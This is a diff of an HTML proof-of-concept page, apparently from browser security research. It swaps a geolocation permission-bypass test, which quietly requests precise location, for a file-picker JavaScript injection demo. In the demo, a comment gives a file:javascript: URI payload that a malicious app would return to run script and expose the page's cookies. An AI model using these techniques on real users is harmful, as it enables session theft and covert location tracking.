@@ -1,30 +1,21 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Geo Permission Bypass Test</title></head>
+<html lang="en">
+<head>
+    <title>File Picker JS Injection PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
 <body>
-<button id="btn">Mulai Pengujian</button>
-<script>
-document.getElementById('btn').addEventListener('click', async () => {
-    // Buka window kedua, meminta lokasi perkiraan
-    const winB = window.open('', 'B', 'width=300,height=200');
-    winB.document.body.innerHTML = '<h1>Meminta lokasi perkiraan...</h1>';
-    winB.navigator.geolocation.getCurrentPosition(
-        () => console.log('B: perkiraan berhasil'),
-        (e) => console.log('B:', e.message),
-        { enableHighAccuracy: false }  // perkiraan
-    );
-    
-    // Window asli secara tersembunyi menanam permintaan presisi (ditunda)
-    setTimeout(() => {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                document.body.innerHTML = `<h1 style="color:red">Kebocoran presisi: ${pos.coords.latitude}, ${pos.coords.longitude}</h1>`;
-            },
-            (e) => console.log('A:', e.message),
-            { enableHighAccuracy: true }  // presisi
-        );
-    }, 500);
-});
-</script>
+    <br><br><br>
+    <center>
+        <h1>Tekan Ctrl+O, pilih "Evil Files" di pemilih file</h1>
+        <p>Payload akan dieksekusi di origin halaman ini</p>
+    </center>
+    <script>
+        // Tidak perlu logika khusus di halaman ini.
+        // APK jahat mengembalikan Uri seperti:
+        // file:javascript:(function(){document.body.innerHTML='<h1>PWNED '+location.origin+' cookie='+document.cookie+'</h1>'})()
+        // Chrome akan menavigasi ke string tersebut dan mengeksekusinya di halaman ini.
+    </script>
 </body>
 </html>
